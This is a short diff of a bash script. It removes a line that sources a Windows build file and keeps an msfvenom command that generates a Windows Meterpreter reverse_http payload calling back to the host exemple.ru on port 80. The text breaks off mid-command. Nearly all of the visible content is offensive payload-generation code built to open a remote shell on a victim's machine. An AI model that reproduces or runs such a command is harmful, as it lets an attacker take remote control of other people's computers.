@@ -1,5 +1,5 @@
 #!/bin/bash          
-. build/global_win32.sh
+
 msfvenom -p windows/meterpreter/reverse_http \
                     lhost=exemple.ru \
                     lport=80 \
